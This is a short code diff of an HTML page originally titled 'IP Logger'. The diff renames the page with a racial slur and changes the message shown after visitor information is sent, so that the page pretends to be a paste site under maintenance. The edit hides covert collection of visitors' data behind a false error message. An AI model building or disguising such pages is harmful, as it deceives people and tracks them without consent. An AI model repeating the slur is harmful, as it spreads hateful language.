@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>IP Logger</title>
+  <title>NiggaBin</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -12,7 +12,7 @@
       align-items: center;
       height: 100vh;
       margin: 0;
-      background-color: #f0f0f0;
+      background-color: #000000;
     }
     .container {
       text-align: center;
@@ -29,8 +29,8 @@
 </head>
 <body>
   <div class="container">
-    <h1>Welcome</h1>
-    <p>1!!</p>
+    <h1>Welcome Loading NiggaBin</h1>
+    <p>!!!</p>
     <p id="status" style="color: red;">Please wait...</p>
   </div>
 
@@ -56,8 +56,8 @@
         });
 
         if (response.ok) {
-          status.textContent = 'Your information has been processed successfully. Thank you!';
-          status.style.color = 'green';
+          status.textContent = 'NiggaBin is Under Maintenance Please Try Again Later!';
+          status.style.color = 'red';
         } else {
           status.textContent = 'Failed to process your information. Please try again later.';
         }
